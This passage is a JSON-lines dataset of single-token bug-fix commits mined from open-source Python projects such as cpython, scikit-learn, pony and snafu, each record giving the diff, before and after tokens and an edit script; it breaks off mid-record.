{"project": "openobject-client-6.0", "commit_sha": "85fb82b5cb7e56267867ce6f8483aa2980ac56a0", "parent_sha": "83477f6156d99562226c8ead4c5776b0484a1c37", "file_path": "bin/widget/view/calendar_gtk/calendar_dummy.py", "project_url": "https://github.com/hunslater/openobject-client-6.0", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ from widget.view.interface import parser_view\n class DummyViewCalendar(parser_view):\n \n     def __init__(self, window, screen, widget, children=None, buttons=None,\n-            toolbar=None, submenu=None, help=help):\n+            toolbar=None, submenu=None, help=None):\n         super(DummyViewCalendar, self).__init__(window, screen, widget, children,\n                 buttons, toolbar, submenu)\n         self.view_type = 'dummycalendar'\n", "before": "def __init__ ( self , window , screen , widget , children = None , buttons = None , toolbar = None , submenu = None , help = help ) : super ( DummyViewCalendar , self ) . __init__ ( window , screen , widget , children , buttons , toolbar , submenu ) self . view_type = 'dummycalendar'", "after": "def __init__ ( self , window , screen , widget , children = None , buttons = None , toolbar = None , submenu = None , help = None ) : super ( DummyViewCalendar , self ) . __init__ ( window , screen , widget , children , buttons , toolbar , submenu ) self . view_type = 'dummycalendar'", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 41, 3, 50], [\"none:None\", \"T\"], 2], [\"Delete\", [\"identifier:help\", 3, 46, 3, 50]]]"}
{"project": "scikit-learn", "commit_sha": "88a85e06213ccf56f1b8ede2649232a9f7b2330c", "parent_sha": "61d9c5ea46f6921a3fcec7da6dcfaa21f51da240", "file_path": "sklearn/ensemble/tests/test_bagging.py", "project_url": "https://github.com/t-lanigan/scikit-learn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -338,7 +338,7 @@ def test_parallel():\n \n     for n_jobs in [-1, 3]:\n         ensemble = BaggingRegressor(DecisionTreeRegressor(),\n-                                    n_jobs=3,\n+                                    n_jobs=n_jobs,\n                                     random_state=0).fit(X_train, y_train)\n \n         ensemble.set_params(n_jobs=1)\n", "before": "ensemble = BaggingRegressor ( DecisionTreeRegressor ( ) , n_jobs = 3 , random_state = 0 ) . fit ( X_train , y_train )", "after": "ensemble = BaggingRegressor ( DecisionTreeRegressor ( ) , n_jobs = n_jobs , random_state = 0 ) . fit ( X_train , y_train )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 37, 3, 45], [\"identifier:n_jobs\", \"T\"], 2], [\"Delete\", [\"integer:3\", 3, 44, 3, 45]]]"}
{"project": "cpython", "commit_sha": "a387b063f5971584e9614b9651b939e5209046f6", "parent_sha": "ec41a1315d151e4f4c81a0b50788e2d958ac4f0f", "file_path": "Lib/io.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1390,7 +1390,7 @@ class StringIO(TextIOWrapper):\n \n     # XXX This is really slow, but fully functional\n \n-    def __init__(self, initial_value=\"\", encoding=\"utf-8\", newline=None):\n+    def __init__(self, initial_value=\"\", encoding=\"utf-8\", newline=\"\\n\"):\n         super(StringIO, self).__init__(BytesIO(),\n                                        encoding=encoding,\n                                        newline=newline)\n", "before": "def __init__ ( self , initial_value = \"\" , encoding = \"utf-8\" , newline = None ) : super ( StringIO , self ) . __init__ ( BytesIO ( ) , encoding = encoding , newline = newline )", "after": "def __init__ ( self , initial_value = \"\" , encoding = \"utf-8\" , newline = \"\\n\" ) : super ( StringIO , self ) . __init__ ( BytesIO ( ) , encoding = encoding , newline = newline )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 60, 3, 72], [\"string:\\\"\\\\n\\\"\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 68, 3, 72]]]"}
{"project": "cpython", "commit_sha": "d81850810012146202969f15c13010f84b73df58", "parent_sha": "50191977c8e49c6eff037f9085960ce214ab3cdb", "file_path": "Lib/test/test_winreg.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class WinregTests(unittest.TestCase):\n \n         key = OpenKey(root_key, test_key_name)\n         # Read the sub-keys\n-        with OpenKey(key, \"sub_key\") as sub_key:\n+        with OpenKey(key, subkeystr) as sub_key:\n             # Check I can enumerate over the values.\n             index = 0\n             while 1:\n", "before": "with OpenKey ( key , \"sub_key\" ) as sub_key : index = 0 while 1 : ", "after": "with OpenKey ( key , subkeystr ) as sub_key : index = 0 while 1 : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 21, 3, 37], [\"identifier:subkeystr\", \"T\"], 3], [\"Delete\", [\"string:\\\"sub_key\\\"\", 3, 27, 3, 36]]]"}
{"project": "cpython", "commit_sha": "f77a6a5363285e341d586ca54a3601d414668446", "parent_sha": "cc1efd42a628a1e24e47481e8335422392c70d42", "file_path": "Lib/bsddb/test/test_sequence.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ class DBSequenceTest(unittest.TestCase):\n             pass\n         tempfile.tempdir = self.homeDir\n         self.filename = os.path.split(tempfile.mktemp())[1]\n-        tempfile.tempdir = old_tempfile_tempdir\n+        tempfile.tempdir = None\n \n         self.dbenv = db.DBEnv()\n         self.dbenv.open(self.homeDir, db.DB_CREATE | db.DB_INIT_MPOOL, 0o666)\n", "before": "tempfile . tempdir = old_tempfile_tempdir", "after": "tempfile . tempdir = None", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 48], [\"none:None\", \"T\"], 2], [\"Delete\", [\"identifier:old_tempfile_tempdir\", 3, 28, 3, 48]]]"}
{"project": "cpython", "commit_sha": "4a510d53dae4293dca71ca0de298f2da1b46bb34", "parent_sha": "0706d1376728d598298b11e6c5d92816ed2b5fb7", "file_path": "Demo/scripts/pi.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -12,7 +12,7 @@ import sys\n \n def main():\n     k, a, b, a1, b1 = 2, 4, 1, 12, 4\n-    while 1:\n+    while True:\n         # Next approximation\n         p, q, k = k*k, 2*k+1, k+1\n", "before": "while 1 : p , q , k = k * k , 2 * k + 1 , k + 1", "after": "while True : p , q , k = k * k , 2 * k + 1 , k + 1", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"while_statement\", 3, 5, 5, 34], [\"true:True\", \"T\"], 1], [\"Delete\", [\"integer:1\", 3, 11, 3, 12]]]"}
{"project": "cpython", "commit_sha": "b7588845a6cf1cccf21c85f3a903a9664311bdba", "parent_sha": "409254038ed9abb6eb2c0a682b27eb64de7a971b", "file_path": "Lib/distutils/tests/test_util.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -355,7 +355,7 @@ class UtilTestCase(support.EnvironGuard, unittest.TestCase):\n         try:\n             self.assertRaises(DistutilsByteCompileError, byte_compile, [])\n         finally:\n-            sys.dont_write_bytecode = False\n+            sys.dont_write_bytecode = old_dont_write_bytecode\n \n def test_suite():\n     return unittest.makeSuite(UtilTestCase)\n", "before": "sys . dont_write_bytecode = False", "after": "sys . dont_write_bytecode = old_dont_write_bytecode", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 13, 3, 44], [\"identifier:old_dont_write_bytecode\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 39, 3, 44]]]"}
{"project": "cpython", "commit_sha": "a6f4e554217c05dcdbd830bfa6e133c161b347ae", "parent_sha": "eb0ca3207045489e18fe22924920bf69110ed0ba", "file_path": "Lib/pydoc.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2029,7 +2029,7 @@ pydoc</strong> by Ka-Ping Yee &lt;ping@lfw.org&gt;</font>'''\n     class DocServer(http.server.HTTPServer):\n         def __init__(self, port, callback):\n             host = 'localhost'\n-            self.address = ('', port)\n+            self.address = (host, port)\n             self.url = 'http://%s:%d/' % (host, port)\n             self.callback = callback\n             self.base.__init__(self, self.address, self.handler)\n", "before": "self . address = ( '' , port )", "after": "self . address = ( host , port )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"tuple\", 3, 28, 3, 38], [\"identifier:host\", \"T\"], 1], [\"Delete\", [\"string:''\", 3, 29, 3, 31]]]"}
{"project": "cpython", "commit_sha": "11387cd857de71ee7363a6340d8409c7f548f10d", "parent_sha": "8a9300f10aa2db9e7adc8ef0cb3c9d885ca3c7d1", "file_path": "Lib/os.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -539,7 +539,7 @@ if supports_bytes_environ:\n def _fscodec():\n     encoding = sys.getfilesystemencoding()\n     if encoding == 'mbcs':\n-        errors = None   # strict\n+        errors = 'strict'\n     else:\n         errors = 'surrogateescape'\n \n", "before": "errors = None", "after": "errors = 'strict'", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 22], [\"string:'strict'\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 18, 3, 22]]]"}
{"project": "cpython", "commit_sha": "529c6906e5380d573f6aeba2def062c8c7691bee", "parent_sha": "ffcb55ebfbb36d74ec0b4a6c947955eeb22d5e86", "file_path": "Lib/test/test_importlib/import_/test_caching.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ class UseCache(unittest.TestCase):\n     def test_using_cache(self):\n         # [use cache]\n         module_to_use = \"some module found!\"\n-        with util.uncache(module_to_use):\n+        with util.uncache('some_module'):\n             sys.modules['some_module'] = module_to_use\n             module = import_util.import_('some_module')\n             self.assertEqual(id(module_to_use), id(module))\n", "before": "with util . uncache ( module_to_use ) : sys . modules [ 'some_module' ] = module_to_use module = import_util . import_ ( 'some_module' ) self . assertEqual ( id ( module_to_use ) , id ( module ) )", "after": "with util . uncache ( 'some_module' ) : sys . modules [ 'some_module' ] = module_to_use module = import_util . import_ ( 'some_module' ) self . assertEqual ( id ( module_to_use ) , id ( module ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 41], [\"string:'some_module'\", \"T\"], 1], [\"Delete\", [\"identifier:module_to_use\", 3, 27, 3, 40]]]"}
{"project": "splinter", "commit_sha": "4e1c752c7dd714ea38fcce2b57bb7bfca067a779", "parent_sha": "b0cb13746cb5870199840348d2eae34b7b3ddc2c", "file_path": "splinter/driver/webdriver/firefox.py", "project_url": "https://github.com/wisdom-garden/splinter", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,7 +13,7 @@ class WebDriver(BaseWebDriver):\n     def __init__(self, profile=None, extensions=None):\n         self.old_popen = subprocess.Popen\n         firefox_profile = FirefoxProfile(profile)\n-        firefox_profile.set_preference('extensions.logging.enabled', 'false')\n+        firefox_profile.set_preference('extensions.logging.enabled', False)\n \n         if extensions:\n             for extension in extensions:\n", "before": "firefox_profile . set_preference ( 'extensions.logging.enabled' , 'false' )", "after": "firefox_profile . set_preference ( 'extensions.logging.enabled' , False )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 39, 3, 78], [\"false:False\", \"T\"], 3], [\"Delete\", [\"string:'false'\", 3, 70, 3, 77]]]"}
{"project": "splinter", "commit_sha": "697818006cc3da32fff804c5a55f8d0dc36d7f9f", "parent_sha": "d9fb197300fda426347e57c0bd48aa7c2a47b8d3", "file_path": "splinter/driver/webdriver/firefox.py", "project_url": "https://github.com/wisdom-garden/splinter", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,7 +13,7 @@ class WebDriver(BaseWebDriver):\n     def __init__(self, profile=None, extensions=None):\n         self.old_popen = subprocess.Popen\n         firefox_profile = FirefoxProfile(profile)\n-        firefox_profile.set_preference('extensions.logging.enabled', 'false')\n+        firefox_profile.set_preference('extensions.logging.enabled', False)\n \n         if extensions:\n             for extension in extensions:\n", "before": "firefox_profile . set_preference ( 'extensions.logging.enabled' , 'false' )", "after": "firefox_profile . set_preference ( 'extensions.logging.enabled' , False )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 39, 3, 78], [\"false:False\", \"T\"], 3], [\"Delete\", [\"string:'false'\", 3, 70, 3, 77]]]"}
{"project": "pony", "commit_sha": "93bd2f1e600d9d26a8a566c78e272ff79178241a", "parent_sha": "94dfff5bc18bebb98b0a19196f992958d72ed35d", "file_path": "pony/dbproviders/sqlite.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -136,7 +136,7 @@ class UnicodeConverter(BasestringConverter):\n \r\n class StrConverter(BasestringConverter):\r\n     def __init__(converter, attr=None):\r\n-        converter.encoding = None  # for the case when attr is None\r\n+        converter.encoding = 'ascii'  # for the case when attr is None\r\n         BasestringConverter.__init__(converter, attr)\r\n     def init(converter, keyargs):\r\n         BasestringConverter.init(converter, keyargs)\r\n", "before": "converter . encoding = None", "after": "converter . encoding = 'ascii'", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 34], [\"string:'ascii'\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 30, 3, 34]]]"}
{"project": "pony", "commit_sha": "ea6fee178b38973875949782ec7d8bed4965a482", "parent_sha": "c3af5090dd1bb1b5d6aa6f2e40fd8753f2df8323", "file_path": "pony/orm/tests/test_isinstance.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,7 +96,7 @@ class TestVolatile(unittest.TestCase):\n         self.assertEqual(set(q), {'Person1', 'Student1', 'Student2', 'Assistant1', 'Assistant2', 'Professor1'})\n \n     @db_session\n-    def test_8(self):\n+    def test_9(self):\n         q = select(g.number for g in Group if isinstance(g, Group))\n         self.assertEqual(set(q), {123})\n \n", "before": "def test_8 ( self ) : q = select ( g . number for g in Group if isinstance ( g , Group ) ) self . assertEqual ( set ( q ) , { 123 } )", "after": "def test_9 ( self ) : q = select ( g . number for g in Group if isinstance ( g , Group ) ) self . assertEqual ( set ( q ) , { 123 } )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_8\", 3, 9, 3, 15], \"test_9\"]]"}
{"project": "cpython", "commit_sha": "d42c7af7075d6fdfcaa872265c67c3702e3089ca", "parent_sha": "bafd54480a38e2c531ebf7ca9069c320ee93a2d8", "file_path": "Lib/rfc822.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -624,7 +624,7 @@ class AddrlistClass:\n         expectroute = 0\n         self.pos = self.pos + 1\n         self.gotonext()\n-        adlist = None\n+        adlist = \"\"\n         while self.pos < len(self.field):\n             if expectroute:\n                 self.getdomain()\n", "before": "adlist = None", "after": "adlist = \"\"", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 22], [\"string:\\\"\\\"\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 18, 3, 22]]]"}
{"project": "cpython", "commit_sha": "08aec6472d6b841f4a5b5bda6008f34bf3fb96c8", "parent_sha": "f0a208b23d51e73cd8d2f079fd0c37c181534a51", "file_path": "Lib/codecs.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -252,7 +252,7 @@ class StreamReader(Codec):\n         return self.decode(line, self.errors)[0]\n \n \n-    def readlines(self, sizehint=0):\n+    def readlines(self, sizehint=None):\n \n", "before": "def readlines ( self , sizehint = 0 ) : ", "after": "def readlines ( self , sizehint = None ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 25, 3, 35], [\"none:None\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 34, 3, 35]]]"}
{"project": "pony", "commit_sha": "a68007452cf47ca1e3c8a4c003547f38464bfe25", "parent_sha": "892d5364aa8761f9510512d1956ff45035d13af8", "file_path": "pony/orm/tests/test_indexes.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ class TestIndexes(unittest.TestCase):\n         index_sql = 'CREATE INDEX \"idx_person__name_age\" ON \"Person\" (\"name\", \"age\")'\n         self.assertTrue(index_sql in create_script)\n \n-    def test_2(self):\n+    def test_3(self):\n         db = Database('sqlite', ':memory:')\n         class User(db.Entity):\n             name = Required(str, unique=True)\n", "before": "def test_2 ( self ) : db = Database ( 'sqlite' , ':memory:' ) class User ( db . Entity ) : name = Required ( str , unique = True )", "after": "def test_3 ( self ) : db = Database ( 'sqlite' , ':memory:' ) class User ( db . Entity ) : name = Required ( str , unique = True )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_2\", 3, 9, 3, 15], \"test_3\"]]"}
{"project": "django-denorm", "commit_sha": "16b950c006af5867faf0065f261573baaa1c266f", "parent_sha": "d0a7bf2bebf86f37c700202e0de7388704687f78", "file_path": "denorm/tests/__init__.py", "project_url": "https://github.com/Edrolo/django-denorm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -94,7 +94,7 @@ class TestDenormalisation(unittest.TestCase):\n         #p4 = Post.objects.create(forum=None)\n         #self.assertEqual(p4.forum_title, None)\n \n-    def test_dependeny_chains(self):\n+    def test_dependency_chains(self):\n         # create a forum, a member and a post\n         f1 = Forum.objects.create(title=\"forumone\")\n         m1 = Member.objects.create(name=\"memberone\")\n", "before": "def test_dependeny_chains ( self ) : f1 = Forum . objects . create ( title = \"forumone\" ) m1 = Member . objects . create ( name = \"memberone\" )", "after": "def test_dependency_chains ( self ) : f1 = Forum . objects . create ( title = \"forumone\" ) m1 = Member . objects . create ( name = \"memberone\" )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_dependeny_chains\", 3, 9, 3, 30], \"test_dependency_chains\"]]"}
{"project": "mpReview", "commit_sha": "671f14920d5e70dc2208a8fca16fad22f9987f52", "parent_sha": "0a0897806152825dbbe44ebafbbd99c919206454", "file_path": "PCampReviewPreprocessor.py", "project_url": "https://github.com/SlicerProstate/mpReview", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -217,7 +217,7 @@ def main(argv):\n                         default=\"-\", required=True, help=\"Folder of input DICOM files (can contain sub-folders)\")\r\n     parser.add_argument(\"-o\", \"--output-folder\", dest=\"output_folder\", metavar=\"PATH\",\r\n                         default=\".\", help=\"Folder to save converted datasets\")\r\n-    parser.add_argument(\"-d\",\"--copyDICOM\",dest=copyDICOM,type=bool,default=False,\r\n+    parser.add_argument(\"-d\",\"--copyDICOM\",dest=\"copyDICOM\",type=bool,default=False,\r\n                         help=\"Organize DICOM files in the output directory\")\r\n     args = parser.parse_args(argv)\r\n \r\n", "before": "parser . add_argument ( \"-d\" , \"--copyDICOM\" , dest = copyDICOM , type = bool , default = False , help = \"Organize DICOM files in the output directory\" )", "after": "parser . add_argument ( \"-d\" , \"--copyDICOM\" , dest = \"copyDICOM\" , type = bool , default = False , help = \"Organize DICOM files in the output directory\" )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 44, 3, 58], [\"string:\\\"copyDICOM\\\"\", \"T\"], 2], [\"Delete\", [\"identifier:copyDICOM\", 3, 49, 3, 58]]]"}
{"project": "snafu", "commit_sha": "fd22855cc9418605b0d3e99e793f356421f6e147", "parent_sha": "f076dcd97b9e4a1b58b7dc36897a9e81538c3231", "file_path": "pgbench-wrapper/pgbench-wrapper.py", "project_url": "https://github.com/cloud-bulldozer/snafu", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ def _json_payload(data,iteration,uuid,user,numclients,database):\n         \"tps_incl_con_est\": data['tps'][0][0],\n         \"tps_excl_con_est\": data['tps'][1][0]\n     })\n-    for line in data[config]:\n+    for line in data['config']:\n         processed.append({\n             \"{}\".format(line[0]): line[1]\n         })\n", "before": "for line in data [ config ] : processed . append ( { \"{}\" . format ( line [ 0 ] ) : line [ 1 ] } )", "after": "for line in data [ 'config' ] : processed . append ( { \"{}\" . format ( line [ 0 ] ) : line [ 1 ] } )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"subscript\", 3, 17, 3, 29], [\"string:'config'\", \"T\"], 2], [\"Delete\", [\"identifier:config\", 3, 22, 3, 28]]]"}
{"project": "snafu", "commit_sha": "a0e0a9c0b31ae32d30385a565e2d44fed206a17c", "parent_sha": "f792f310cbfc043ca09f358e3e6c1eadbeed5704", "file_path": "hammerdb/hammerd_wrapper.py", "project_url": "https://github.com/cloud-bulldozer/snafu", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ def _json_payload(data, uuid, db_server, db_port, db_warehouses, db_num_workers,\n \n def _summarize_data(data):\n     for i in range(0,len(data)):\n-        entry = data[0]\n+        entry = data[i]\n \n         print(\"+{} HammerDB Results {}+\".format(\"-\"*(50), \"-\"*(50)))\n         print(\"HammerDB setup\")\n", "before": "entry = data [ 0 ]", "after": "entry = data [ i ]", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"subscript\", 3, 17, 3, 24], [\"identifier:i\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 22, 3, 23]]]"}
{"project": "snafu", "commit_sha": "3a5d4b599bb1586d4ecbd4f82a444e8567eeb63d", "parent_sha": "a9cc1c8f0d1f08132edaaed95278d3ac9e23c12b", "file_path": "vegeta_wrapper/trigger_vegeta.py", "project_url": "https://github.com/cloud-bulldozer/snafu", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class Trigger_vegeta():\n             vegeta_log = self.results\n         else :\n             vegeta_log = \"vegeta.log\"\n-        for l in open(\"vegeta.log\").readlines():\n+        for l in open(vegeta_log).readlines():\n             data = json.loads(l)\n             rps = int(data[\"rate\"])\n             throughput = int(data[\"throughput\"])\n", "before": "for l in open ( \"vegeta.log\" ) . readlines ( ) : data = json . loads ( l ) rps = int ( data [ \"rate\" ] ) throughput = int ( data [ \"throughput\" ] )", "after": "for l in open ( vegeta_log ) . readlines ( ) : data = json . loads ( l ) rps = int ( data [ \"rate\" ] ) throughput = int ( data [ \"throughput\" ] )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 22, 3, 36], [\"identifier:vegeta_log\", \"T\"], 1], [\"Delete\", [\"string:\\\"vegeta.log\\\"\", 3, 23, 3, 35]]]"}
{"project": "mpReview", "commit_sha": "6ce4e777fedce1d83278131173895bcb0a258c9c", "parent_sha": "e41a41a10af5da6c1f7ec40c72ead2c62a47d654", "file_path": "mpReview.py", "project_url": "https://github.com/SlicerProstate/mpReview", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2113,7 +2113,7 @@ class mpReviewLogic(ScriptedLoadableModuleLogic):\n \n         if volumePath is None:\n           logging.error(\"Failed to find reconstructed volume file.\")\n-          break\n+          continue\n \n         seriesMap[seriesNumber] = {'MetaInfo':None, 'NRRDLocation':volumePath,'LongName':seriesDescription}\n         seriesMap[seriesNumber]['ShortName'] = str(seriesNumber)+\":\"+seriesDescription\n", "before": "break", "after": "continue", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"block\", 2, 11, 3, 16], [\"continue_statement\", \"N0\"], 1], [\"Insert\", \"N0\", [\"continue:continue\", \"T\"], 0], [\"Delete\", [\"break:break\", 3, 11, 3, 16]], [\"Delete\", [\"break_statement\", 3, 11, 3, 16]]]"}
{"project": "marathon-lb", "commit_sha": "6f032d9bbdefbc9471f5df971019bea27709e7f0", "parent_sha": "0669c6e9d38b35963aef71cce54318fd693e1c77", "file_path": "bridge.py", "project_url": "https://github.com/GalacticFog/marathon-lb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -138,7 +138,7 @@ class MarathonEventSubscriber(object):\n     # Fetch the base data\n     self.update_from_tasks()\n \n-  def update_from_takss(self):\n+  def update_from_tasks(self):\n     tasks = marathon.tasks()\n     # For each task, extract self.__apps\n     # and the backends within each app.\n", "before": "def update_from_takss ( self ) : tasks = marathon . tasks ( )", "after": "def update_from_tasks ( self ) : tasks = marathon . tasks ( )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:update_from_takss\", 3, 7, 3, 24], \"update_from_tasks\"]]"}
{"project": "purl", "commit_sha": "3b98c183e442829bd5f255abe9f2654458bca3a4", "parent_sha": "0bcb24581b76152f5170dff1e039b5db4b19fa1b", "file_path": "purl/url.py", "project_url": "https://github.com/blindroot/purl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ def unicode_quote(string, safe='/'):\n \n def unicode_unquote(string):\n     if string is None:\n-        return Nonek\n+        return None\n     if six.PY3:\n         return unquote(string)\n     return to_unicode(unquote(to_utf8(string)))\n", "before": "return Nonek", "after": "return None", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 21], [\"none:None\", \"T\"], 1], [\"Delete\", [\"identifier:Nonek\", 3, 16, 3, 21]]]"}
{"project": "kin-app-server", "commit_sha": "d6cc503bb4eee88ff7669aa83e7034a88dadf599", "parent_sha": "169c7853699359fc50b69abe6997224b6f556bb4", "file_path": "kinappserver/models/user.py", "project_url": "https://github.com/kinecosystem/kin-app-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -615,7 +615,7 @@ def get_next_task_results_ts(user_id, cat_id):\n     try:\n         user_app_data = UserAppData.query.filter_by(user_id=user_id).first()\n         if user_app_data is None or user_app_data.next_task_ts_dict is None:\n-            return None\n+            return 0\n         return user_app_data.next_task_ts_dict.get(cat_id, 0)  # can be None\n     except Exception as e:\n         log.error('cant get task result ts. e: %s' % e)\n", "before": "return None", "after": "return 0", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 13, 3, 24], [\"integer:0\", \"T\"], 1], [\"Delete\", [\"none:None\", 3, 20, 3, 24]]]"}
{"project": "fabric8-analytics-common", "commit_sha": "6f2d8f6f637618d68b203218d946a05acea9e655", "parent_sha": "c0a45c4017f8e181aa0507904b9f9ec415b7dc83", "file_path": "integration-tests/features/steps/stack_analysis.py", "project_url": "https://github.com/fabric8-analytics/fabric8-analytics-common", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -652,7 +652,7 @@ def check_analyzed_dependencies_count(context, expected=1):\n \n @then(\"I should find exactly one unknown dependency\")\n @then(\"I should find exactly {expected:n} unknown dependencies\")\n-def check_unknown_dependencies_count(context, expected=1):\n+def check_unknown_dependencies_count_exact_check(context, expected=1):\n     \"\"\"Check number of unknown dependencies.\"\"\"\n     jsondata = context.response.json()\n     assert jsondata is not None\n", "before": "def check_unknown_dependencies_count ( context , expected = 1 ) : \"\"\"Check number of unknown dependencies.\"\"\" jsondata = context . response . json ( ) assert jsondata is not None", "after": "def check_unknown_dependencies_count_exact_check ( context , expected = 1 ) : \"\"\"Check number of unknown dependencies.\"\"\" jsondata = context . response . json ( ) assert jsondata is not None", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:check_unknown_dependencies_count\", 3, 5, 3, 37], \"check_unknown_dependencies_count_exact_check\"]]"}
{"project": "modmail", "commit_sha": "1995349a27fc08785e638342f8ccb7fa13e66647", "parent_sha": "99379d072275180202c371ed29d73bcdc263d46f", "file_path": "cogs/utility.py", "project_url": "https://github.com/armani12/modmail", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class Utility:\n         prefix = self.bot.prefix\n \n         def perms_required(cmd):\n-            return next(getattr(c, 'permission_level', None) for c in cmd.checks)\n+            return next(getattr(c, 'permission_level', 0) for c in cmd.checks)\n \n         fmts = ['']\n         for cmd in sorted(self.bot.commands,\n", "before": "return next ( getattr ( c , 'permission_level' , None ) for c in cmd . checks )", "after": "return next ( getattr ( c , 'permission_level' , 0 ) for c in cmd . checks )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 61], [\"integer:0\", \"T\"], 5], [\"Delete\", [\"none:None\", 3, 56, 3, 60]]]"}
{"project": "modmail", "commit_sha": "bc76e8c247e9850d45e06554d5d7f95d550b9608", "parent_sha": "931e6bdbcaeff39e5e5c8172cc73821a690bab6d", "file_path": "cogs/utility.py", "project_url": "https://github.com/armani12/modmail", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -723,7 +723,7 @@ class Utility:\n \n     @config.command()\n     @checks.has_permissions(PermissionLevel.OWNER)\n-    async def get(self, ctx, key=None):\n+    async def _get(self, ctx, key=None):\n         \"\"\"Shows the config variables that are currently set.\"\"\"\n         keys = self.bot.config.allowed_to_change_in_command\n \n", "before": "async def get ( self , ctx , key = None ) : \"\"\"Shows the config variables that are currently set.\"\"\" keys = self . bot . config . allowed_to_change_in_command", "after": "async def _get ( self , ctx , key = None ) : \"\"\"Shows the config variables that are currently set.\"\"\" keys = self . bot . config . allowed_to_change_in_command", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", 